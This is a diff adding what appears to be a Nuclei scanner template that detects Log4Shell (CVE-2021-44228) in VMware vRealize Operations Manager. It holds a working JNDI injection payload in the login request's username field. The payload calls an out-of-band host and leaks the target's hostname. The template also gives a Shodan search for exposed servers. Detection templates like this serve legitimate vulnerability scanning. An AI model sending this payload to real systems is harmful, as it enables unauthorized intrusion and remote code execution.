@@ -1,0 +1,77 @@
+id: vmware-operation-manager-log4j
+
+info:
+  name: VMware Operations Manager - Remote Code Execution (Apache Log4j)
+  author: DhiyaneshDK
+  severity: critical
+  description: VMware Operations Manager is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  reference:
+    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+    cpe: cpe:2.3:a:vmware:vrealize_operations_manager:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"vRealize Operations Manager"
+    product: vrealize_operations_manager
+    vendor: vmware
+  tags: cve,cve2021,rce,jndi,log4j,vmware,kev,oast
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        POST /ui/login.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/ui/login.action
+        Sec-Fetch-Dest: empty
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Site: same-origin
+
+        mainAction=login&userName=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: word
+        part: header
+        words:
+          - 'Path=/ui'
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+# digest: 490a0046304402202b3fe4df2472802ba8b2efddbed64b702babd50985122660f3269a67d8e927bd02200d3e0df1205b0cab4b5fab119262db2f9783ed4385dfe66db5b75d304ba303b0:922c64590222798bb761d5b6d8e72950
